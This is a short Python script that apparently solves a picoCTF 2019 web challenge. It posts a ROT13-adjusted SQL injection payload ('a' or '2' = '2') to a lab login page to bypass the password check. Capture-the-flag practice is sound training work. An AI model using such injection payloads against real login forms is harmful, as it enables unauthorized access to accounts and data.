#!/usr/bin/env python
import requests
import sys
from urllib.parse import urljoin


def solve(url='http://2019shell1.picoctf.com:32237'):
    req = requests.Session()

    # SELECT * FROM admin where password = 'nqzva'

    tr = str.maketrans('nopqrstuvwxyzabcdefghijklm', 'abcdefghijklmnopqrstuvwxyz')
    password = "a' or '2' = '2".translate(tr)

    data = {
        'password': password,
        'debug': '1',
    }

    r = req.post(urljoin(url, '/login.php'), data=data)
    print(r, r.url, r.headers)
    print(r.text)


if __name__ == '__main__':
    print(solve(*sys.argv[1:]))
